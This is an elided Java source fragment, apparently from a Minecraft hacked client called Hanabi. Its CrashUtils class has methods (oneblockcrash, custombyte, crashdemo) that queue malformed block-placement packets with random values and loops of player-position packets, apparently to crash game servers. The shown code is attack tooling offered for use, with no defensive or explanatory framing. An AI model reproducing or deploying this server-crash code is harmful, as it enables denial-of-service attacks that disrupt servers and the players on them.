...
public class CrashUtils {
   ...
   public void oneblockcrash(ItemStack stack) {
      Hanabi.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - (double)(new Random()).nextFloat() - 1.0D, Minecraft.getMinecraft().thePlayer.posZ), (new Random()).nextInt(255), stack, 0.0F, 0.0F, 0.0F));
   }
   ...
   public void custombyte(int amount) {
      ...
      for(int j = 0; j < amount; ++j) {
         double i = ThreadLocalRandom.current().nextDouble(0.4D, 1.2D);
         if (y > 255.0D) {
            y = 255.0D;
         }

         Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C04PacketPlayerPosition(x, y, z, false));
         Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C04PacketPlayerPosition(x, y, z, true));
      }

   }

   public void crashdemo(String sign, int booktype, int bookvalue, int redo, boolean customedit, CrashUtils.CrashType type, int amount) {
      ...
      if (customedit) {
         ...
         for(int var15 = 0; var15 < bookvalue; ++var15) {
